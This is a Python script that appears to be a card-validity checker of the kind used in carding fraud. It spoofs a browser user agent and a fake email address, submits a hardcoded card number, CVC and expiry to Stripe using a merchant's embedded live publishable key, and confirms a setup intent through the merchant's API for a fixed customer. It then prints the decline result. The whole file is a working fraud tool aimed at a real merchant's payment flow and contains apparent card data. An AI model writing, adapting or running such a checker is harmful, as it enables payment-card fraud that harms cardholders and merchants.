import requests
from faker import Faker
from user_agent import generate_user_agent

u = generate_user_agent()
r = requests.Session()
f = Faker()
x = f.email()

headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': u,
}

data = f'billing_details[name]=PythonApi+undefined&billing_details[email]={x}&billing_details[address][postal_code]=10076&billing_details[address][country]=US&type=card&card[number]=4315+0375+3963+5072&card[cvc]=346&card[exp_year]=29&card[exp_month]=07&key=pk_live_51NqVKuGZrwG9MfzHDmsUzwWfRMllqQIJC5Nsx3XDxJhRFEHeWhS3YWxsH3Tk1nROsBsFco6CpQeSG6Sk8yvJFQmU00VfsC8zfE'

response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

id = response.json()['id']

headers = {
    'authority': 'main-cdn.nas.io',
    'accept': '*/*',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'access-control-request-headers': 'authorization,content-type',
    'access-control-request-method': 'POST',
    'origin': 'https://nas.com',
    'referer': 'https://nas.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': u,
}

response = r.options('https://main-cdn.nas.io/api/v1/create-setup-intent-v2/', headers=headers)

headers = {
    'authority': 'main-cdn.nas.io',
    'accept': '*/*',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://nas.com',
    'referer': 'https://nas.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': u,
}

json_data = {
    'customerId': 'cus_Ua0sculgFyRYCE',
    'paymentProvider': 'stripe-us',
}

response = r.post('https://main-cdn.nas.io/api/v1/create-setup-intent-v2/', headers=headers, json=json_data)

data = response.json()
xp = data['setupIntent']['id']
xxp = data['setupIntent']['client_secret']

headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': u,
}

data = f'payment_method={id}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51NqVKuGZrwG9MfzHDmsUzwWfRMllqQIJC5Nsx3XDxJhRFEHeWhS3YWxsH3Tk1nROsBsFco6CpQeSG6Sk8yvJFQmU00VfsC8zfE&client_attribution_metadata[merchant_integration_source]=l1&client_secret={xxp}'

response = r.post(
    f'https://api.stripe.com/v1/setup_intents/{xp}/confirm',
    headers=headers,
    data=data,
)

python = response.json()
woo = python['error']
print(woo)